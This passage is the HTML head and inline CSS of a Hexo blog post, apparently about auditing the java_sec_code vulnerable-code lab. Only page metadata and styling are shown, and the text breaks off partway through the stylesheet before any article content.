<!DOCTYPE html>
<html lang="en">
    <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/#5.8.0'>
  <meta name="generator" content="Hexo 7.3.0">
  <meta name="Volantis" content="5.8.0">
  <meta charset="utf-8">
  <!-- SEO相关 -->
  
  <link rel="canonical" href="http://example.com/2025/07/22/java-sec-code/"/>
  <!-- 渲染优化 -->
    <meta http-equiv='x-dns-prefetch-control' content='on' />
      <link rel='dns-prefetch' href='https://unpkg.com'>
      <link rel="preconnect" href="https://unpkg.com" crossorigin>
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="Content-Security-Policy" content=" default-src 'self' https:; block-all-mixed-content; base-uri 'self' https:; form-action 'self' https:; worker-src 'self' https:; connect-src 'self' https: *; img-src 'self' data: https: *; media-src 'self' https: *; font-src 'self' data: https: *; frame-src 'self' https: *; manifest-src 'self' https: *; child-src https:; script-src 'self' https: 'unsafe-inline' *; style-src 'self' https: 'unsafe-inline' *; ">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
  <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
  <meta content="telephone=no" name="format-detection">
  <!-- import head_begin begin -->
  <!-- import head_begin end -->
  <!-- Custom Files headBegin begin-->
  
  <!-- Custom Files headBegin end-->
  <!-- front-matter head_begin begin -->
  <!-- front-matter head_begin end -->
  <link rel="preload" href="/css/style.css" as="style">
  <link rel="preload" href="https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/VarelaRound/VarelaRound-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
<link rel="preload" href="https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <!-- feed -->
  <!-- 页面元数据 -->
  <title>java_sec_code - Hexo</title>
  <meta name="keywords" content="null">
  <meta desc name="description" content="Hexo - John Doe - Hexo">
  
<meta property="og:type" content="article">
<meta property="og:title" content="java_sec_code">
<meta property="og:url" content="http://example.com/2025/07/22/java-sec-code/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="java_sec_code前言网安还是有点冷门了，这个靶场在网上没有那种特别齐全的文章，不知道有没有flag这个东西，但是看了下别人的博客好像都是看漏洞的代码然后进行审计。 还有那个一开始的登录框好抽象，我以为是第一道题目，没想到是直接输入密码进行登录 12adminadmin123  登录进行后是一个简单的前端界面   这里面有各种漏洞主要集中在这个路径下 1java-sec-code-mast">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
<meta property="article:published_time" content="2025-07-22T11:28:08.000Z">
<meta property="article:modified_time" content="2025-08-13T09:10:51.866Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
  <style>
    /* 首屏样式 */
    #safearea {
  display: none;
}
:root {
  --color-site-body: #f4f4f4;
  --color-site-bg: #f4f4f4;
  --color-site-inner: #fff;
  --color-site-footer: #666;
  --color-card: #fff;
  --color-text: #444;
  --color-block: #f6f6f6;
  --color-inlinecode: #c74f00;
  --color-codeblock: #fff7ea;
  --color-h1: #3a3a3a;
  --color-h2: #3a3a3a;
  --color-h3: #333;
  --color-h4: #444;
  --color-h5: #555;
  --color-h6: #666;
  --color-p: #444;
  --color-list: #666;
  --color-list-hl: #30ad91;
  --color-meta: #888;
  --color-read-bkg: #e0d8c8;
  --color-read-post: #f8f1e2;
  --color-copyright-bkg: #f5f5f5;
}
* {
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  outline: none;
  margin: 0;
  padding: 0;
}
*::-webkit-scrollbar {
  height: 4px;
  width: 4px;
}
*::-webkit-scrollbar-track-piece {
  background: transparent;
}
*::-webkit-scrollbar-thumb {
  background: #3dd9b6;
  cursor: pointer;
  border-radius: 2px;
  -webkit-border-radius: 2px;
}
*::-webkit-scrollbar-thumb:hover {
  background: #ff5722;
}
html {
  color: var(--color-text);
  width: 100%;
  height: 100%;
  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
  font-size: 16px;
}
html >::-webkit-scrollbar {
  height: 4px;
  width: 4px;
}
html >::-webkit-scrollbar-track-piece {
  background: transparent;
}
html >::-webkit-scrollbar-thumb {
  background: #54b5a0 linear-gradient(45deg, rgba(255,255,255,0.4) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0.4) 75%, transparent 75%, transparent);
  cursor: pointer;
  border-radius: 2px;
  -webkit-border-radius: 2px;
}
html >::-webkit-scrollbar-thumb:hover {
  background: #54b5a0 linear-gradient(45deg, rgba(255,255,255,0.4) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0.4) 75%, transparent 75%, transparent);
}
body {
  background-color: var(--color-site-body);
  text-rendering: optimizelegibility;
  -webkit-tap-highlight-color: rgba(0,0,0,0);
  line-height: 1.6;
  -webkit-text-size-adjust: 100%;
  -ms-text-size-adjust: 100%;
}
body.modal-active {
  overflow: hidden;
}
@media screen and (max-width: 680px) {
  body.modal-active {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
  }
}
a {
  color: #2092ec;
  cursor: pointer;
  text-decoration: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
a:hover {
  color: #ff5722;
}
a:active,
a:hover {
  outline: 0;
}
ul,
ol {
  padding-left: 0;
}
ul li,
ol li {
  list-style: none;
}
header {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
img {
  border: 0;
  background: none;
  max-width: 100%;
}
svg:not(:root) {
  overflow: hidden;
}
hr {
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  -webkit-box-sizing: content-box;
  -moz-box-sizing: content-box;
  height: 0;
  border: 0;
  border-radius: 1px;
  -webkit-border-radius: 1px;
  border-bottom: 1px solid rgba(68,68,68,0.1);
}
button,
input {
  color: inherit;
  font: inherit;
  margin: 0;
}
button {
  overflow: visible;
  text-transform: none;
  -webkit-appearance: button;
  cursor: pointer;
}
@supports (backdrop-filter: blur(20px)) {
  .blur {
    background: rgba(255,255,255,0.9) !important;
    backdrop-filter: saturate(200%) blur(20px);
  }
}
.shadow {
  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
}
.shadow.floatable {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.shadow.floatable:hover {
  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
}
#l_cover {
  min-height: 64px;
}
.cover-wrapper {
  top: 0;
  left: 0;
  max-width: 100%;
  height: 100vh;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  align-self: center;
  align-content: center;
  color: var(--color-site-inner);
  padding: 0 16px;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  position: relative;
  overflow: hidden;
  margin-bottom: -100px;
}
.cover-wrapper .cover-bg {
  position: absolute;
  width: 100%;
  height: 100%;
  background-position: center;
  background-size: cover;
  -webkit-background-size: cover;
  -moz-background-size: cover;
}
.cover-wrapper .cover-bg.lazyload:not(.loaded) {
  opacity: 0;
  -webkit-opacity: 0;
  -moz-opacity: 0;
}
.cover-wrapper .cover-bg.lazyload.loaded {
  animation-delay: 0s;
  animation-duration: 0.5s;
  animation-fill-mode: forwards;
  animation-timing-function: ease-out;
  animation-name: fadeIn;
}
@-moz-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-webkit-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-o-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.cover-wrapper .cover-body {
  z-index: 1;
  position: relative;
  width: 100%;
  height: 100%;
}
.cover-wrapper#full {
  height: calc(100vh + 100px);
  padding-bottom: 100px;
}
.cover-wrapper#half {
  max-height: 640px;
  min-height: 400px;
  height: calc(36vh - 64px + 200px);
}
.cover-wrapper #scroll-down {
  width: 100%;
  height: 64px;
  position: absolute;
  bottom: 100px;
  text-align: center;
  cursor: pointer;
}
.cover-wrapper #scroll-down .scroll-down-effects {
  color: #fff;
  font-size: 24px;
  line-height: 64px;
  position: absolute;
  width: 24px;
  left: calc(50% - 12px);
  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
  animation: scroll-down-effect 1.5s infinite;
  -webkit-animation: scroll-down-effect 1.5s infinite;
  -khtml-animation: scroll-down-effect 1.5s infinite;
  -moz-animation: scroll-down-effect 1.5s infinite;
  -o-animation: scroll-down-effect 1.5s infinite;
  -ms-animation: scroll-down-effect 1.5s infinite;
}
@-moz-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-webkit-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-o-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.cover-wrapper .cover-body {
  margin-top: 64px;
  margin-bottom: 100px;
}
.cover-wrapper .cover-body,
.cover-wrapper .cover-body .top,
.cover-wrapper .cover-body .bottom {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  max-width: 100%;
}
.cover-wrapper .cover-body .bottom {
  margin-top: 32px;
}
.cover-wrapper .cover-body .title {
  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
  font-size: 3.125rem;
  line-height: 1.2;
  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
}
.cover-wrapper .cover-body .subtitle {
  font-size: 20px;
}
.cover-wrapper .cover-body .logo {
  max-height: 120px;
  max-width: calc(100% - 4 * 16px);
}
@media screen and (min-height: 1024px) {
  .cover-wrapper .cover-body .title {
    font-size: 3rem;
  }
  .cover-wrapper .cover-body .subtitle {
    font-size: 1.05rem;
  }
  .cover-wrapper .cover-body .logo {
    max-height: 150px;
  }
}
.cover-wrapper .cover-body .m_search {
  position: relative;
  max-width: calc(100% - 16px);
  width: 320px;
  vertical-align: middle;
}
.cover-wrapper .cover-body .m_search .form {
  position: relative;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  width: 100%;
}
.cover-wrapper .cover-body .m_search .icon,
.cover-wrapper .cover-body .m_search .input {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.cover-wrapper .cover-body .m_search .icon {
  position: absolute;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  line-height: 2.5rem;
  width: 32px;
  top: 0;
  left: 5px;
  color: rgba(68,68,68,0.75);
}
.cover-wrapper .cover-body .m_search .input {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  height: 2.5rem;
  width: 100%;
  box-shadow: none;
  -webkit-box-shadow: none;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  font-size: 0.875rem;
  -webkit-appearance: none;
  padding-left: 36px;
  border-radius: 1.4rem;
  -webkit-border-radius: 1.4rem;
  background: rgba(255,255,255,0.6);
  backdrop-filter: blur(10px);
  border: none;
  color: var(--color-text);
}
@media screen and (max-width: 500px) {
  .cover-wrapper .cover-body .m_search .input {
    padding-left: 36px;
  }
}
.cover-wrapper .cover-body .m_search .input:hover {
  background: rgba(255,255,255,0.8);
}
.cover-wrapper .cover-body .m_search .input:focus {
  background: #fff;
}
.cover-wrapper .list-h {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  flex-direction: row;
  flex-wrap: wrap;
  -webkit-flex-wrap: wrap;
  -khtml-flex-wrap: wrap;
  -moz-flex-wrap: wrap;
  -o-flex-wrap: wrap;
  -ms-flex-wrap: wrap;
  align-items: stretch;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
.cover-wrapper .list-h a {
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -webkit-flex: 1 0;
  -ms-flex: 1 0;
  flex: 1 0;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  font-weight: 600;
}
.cover-wrapper .list-h a img {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  border-radius: 2px;
  -webkit-border-radius: 2px;
  margin: 4px;
  min-width: 40px;
  max-width: 44px;
}
@media screen and (max-width: 768px) {
  .cover-wrapper .list-h a img {
    min-width: 36px;
    max-width: 40px;
  }
}
@media screen and (max-width: 500px) {
  .cover-wrapper .list-h a img {
    margin: 2px 4px;
    min-width: 32px;
    max-width: 36px;
  }
}
@media screen and (max-width: 375px) {
  .cover-wrapper .list-h a img {
    min-width: 28px;
    max-width: 32px;
  }
}
.cover-wrapper {
  max-width: 100%;
}
.cover-wrapper.search .bottom .menu {
  margin-top: 16px;
}
.cover-wrapper.search .bottom .menu .list-h a {
  white-space: nowrap;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  flex-direction: row;
  align-items: baseline;
  padding: 2px;
  margin: 4px;
  color: var(--color-site-inner);
  opacity: 0.75;
  -webkit-opacity: 0.75;
  -moz-opacity: 0.75;
  text-shadow: 0 1px 2px rgba(0,0,0,0.05);
  border-bottom: 2px solid transparent;
}
.cover-wrapper.search .bottom .menu .list-h a i {
  margin-right: 4px;
}
.cover-wrapper.search .bottom .menu .list-h a p {
  font-size: 0.9375rem;
}
.cover-wrapper.search .bottom .menu .list-h a:hover,
.cover-wrapper.search .bottom .menu .list-h a.active,
.cover-wrapper.search .bottom .menu .list-h a:active {
  opacity: 1;
  -webkit-opacity: 1;
  -moz-opacity: 1;
  border-bottom: 2px solid var(--color-site-inner);
}
.cover-wrapper.dock .menu,
.cover-wrapper.featured .menu,
.cover-wrapper.focus .menu {
  border-radius: 6px;
  -webkit-border-radius: 6px;
}
.cover-wrapper.dock .menu .list-h a,
.cover-wrapper.featured .menu .list-h a,
.cover-wrapper.focus .menu .list-h a {
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  padding: 12px;
  line-height: 24px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  border-bottom: none;
  text-align: center;
  align-content: flex-end;
  color: rgba(68,68,68,0.7);
  font-size: 1.5rem;
}
@media screen and (max-width: 500px) {
  .cover-wrapper.dock .menu .list-h a,
  .cover-wrapper.featured .menu .list-h a,
  .cover-wrapper.focus .menu .list-h a {
    padding: 12px 8px;
  }
}
.cover-wrapper.dock .menu .list-h a i,
.cover-wrapper.featured .menu .list-h a i,
.cover-wrapper.focus .menu .list-h a i {
  margin: 8px;
}
.cover-wrapper.dock .menu .list-h a p,
.cover-wrapper.featured .menu .list-h a p,
.cover-wrapper.focus .menu .list-h a p {
  font-size: 0.875rem;
}
.cover-wrapper.dock .menu .list-h a.active,
.cover-wrapper.featured .menu .list-h a.active,
.cover-wrapper.focus .menu .list-h a.active {
  background: var(--color-card);
  backdrop-filter: none;
}
.cover-wrapper.dock .menu .list-h a.active i,
.cover-wrapper.featured .menu .list-h a.active i,
.cover-wrapper.focus .menu .list-h a.active i,
.cover-wrapper.dock .menu .list-h a.active i+p,
.cover-wrapper.featured .menu .list-h a.active i+p,
.cover-wrapper.focus .menu .list-h a.active i+p {
  color: #3dd9b6;
}
.cover-wrapper.dock .menu .list-h a.active img+p,
.cover-wrapper.featured .menu .list-h a.active img+p,
.cover-wrapper.focus .menu .list-h a.active img+p {
  color: var(--color-text);
}
.cover-wrapper.dock .menu .list-h a:hover,
.cover-wrapper.featured .menu .list-h a:hover,
.cover-wrapper.focus .menu .list-h a:hover {
  background: var(--color-card);
}
.cover-wrapper.dock .top {
  margin-bottom: 48px;
}
.cover-wrapper.dock .menu {
  background: rgba(255,255,255,0.5);
  position: absolute;
  bottom: 0;
  max-width: 100%;
}
.cover-wrapper.dock .menu .list-h {
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  margin: 4px;
}
.cover-wrapper.dock .menu .list-h a+a {
  margin-left: 4px;
}
@media screen and (max-width: 500px) {
  .cover-wrapper.dock .menu .list-h {
    overflow-x: scroll;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar {
    height: 0;
    width: 0;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar-track-piece {
    background: transparent;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar-thumb {
    background: #3dd9b6;
    cursor: pointer;
    border-radius: 0;
    -webkit-border-radius: 0;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar-thumb:hover {
    background: #ff5722;
  }
}
@supports (backdrop-filter: blur(20px)) {
  .cover-wrapper.dock .menu {
    background: rgba(255,255,255,0.5);
    backdrop-filter: saturate(200%) blur(20px);
  }
}
@font-face {
  font-family: 'UbuntuMono';
  src: url("https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf");
  font-weight: 'normal';
  font-style: 'normal';
  font-display: swap;
}
@font-face {
  font-family: 'Varela Round';
  src: url("https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/VarelaRound/VarelaRound-Regular.ttf");
  font-weight: 'normal';
  font-style: 'normal';
  font-display: swap;
}
.l_header {
  position: fixed;
  z-index: 1000;
  top: 0;
  width: 100%;
  height: 64px;
  background: var(--color-card);
  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
}
.l_header.auto {
  transition: opacity 0.4s ease;
  -webkit-transition: opacity 0.4s ease;
  -khtml-transition: opacity 0.4s ease;
  -moz-transition: opacity 0.4s ease;
  -o-transition: opacity 0.4s ease;
  -ms-transition: opacity 0.4s ease;
  visibility: hidden;
}
.l_header.auto.show {
  opacity: 1 !important;
  -webkit-opacity: 1 !important;
  -moz-opacity: 1 !important;
  visibility: visible;
}
.l_header .container {
  margin-left: 16px;
  margin-right: 16px;
}
.l_header #wrapper {
  height: 100%;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
.l_header #wrapper .nav-main,
.l_header #wrapper .nav-sub {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  justify-content: space-between;
  -webkit-justify-content: space-between;
  -khtml-justify-content: space-between;
  -moz-justify-content: space-between;
  -o-justify-content: space-between;
  -ms-justify-content: space-between;
  align-items: center;
}
.l_header #wrapper .nav-main {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.l_header #wrapper.sub .nav-main {
  transform: translateY(-64px);
  -webkit-transform: translateY(-64px);
  -khtml-transform: translateY(-64px);
  -moz-transform: translateY(-64px);
  -o-transform: translateY(-64px);
  -ms-transform: translateY(-64px);
}
.l_header #wrapper .nav-sub {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  opacity: 0;
  -webkit-opacity: 0;
  -moz-opacity: 0;
  height: 64px;
  width: calc(100% - 2 * 16px);
  position: absolute;
}
.l_header #wrapper .nav-sub ::-webkit-scrollbar {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
}
@media screen and (min-width: 2048px) {
  .l_header #wrapper .nav-sub {
    max-width: 55vw;
    margin: auto;
  }
}
.l_header #wrapper.sub .nav-sub {
  opacity: 1;
  -webkit-opacity: 1;
  -moz-opacity: 1;
}
.l_header #wrapper .title {
  position: relative;
  color: var(--color-text);
  padding-left: 24px;
  max-height: 64px;
}
.l_header #wrapper .nav-main .title {
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  flex-shrink: 0;
  line-height: 64px;
  padding: 0 24px;
  font-size: 1.25rem;
  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
}
.l_header #wrapper .nav-main .title img {
  height: 64px;
}
.l_header .nav-sub {
  max-width: 1080px;
  margin: auto;
}
.l_header .nav-sub .title {
  font-weight: bold;
  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
  line-height: 1.2;
  max-height: 64px;
  white-space: normal;
  flex-shrink: 1;
}
.l_header .switcher {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  line-height: 64px;
  align-items: center;
}
.l_header .switcher .s-toc {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
}
@media screen and (max-width: 768px) {
  .l_header .switcher .s-toc {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: -ms-flexbox /* TWEENER - IE 10 */;
    display: -webkit-flex /* NEW - Chrome */;
    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
    display: flex;
  }
}
.l_header .switcher >li {
  height: 48px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  margin: 2px;
}
@media screen and (max-width: 500px) {
  .l_header .switcher >li {
    margin: 0 1px;
    height: 48px;
  }
}
.l_header .switcher >li >a {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  align-items: center;
  width: 48px;
  height: 48px;
  padding: 0.85em 1.1em;
  border-radius: 100px;
  -webkit-border-radius: 100px;
  border: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  color: #3dd9b6;
}
.l_header .switcher >li >a:hover {
  border: none;
}
.l_header .switcher >li >a.active,
.l_header .switcher >li >a:active {
  border: none;
  background: var(--color-site-bg);
}
@media screen and (max-width: 500px) {
  .l_header .switcher >li >a {
    width: 36px;
    height: 48px;
  }
}
.l_header .nav-sub .switcher {
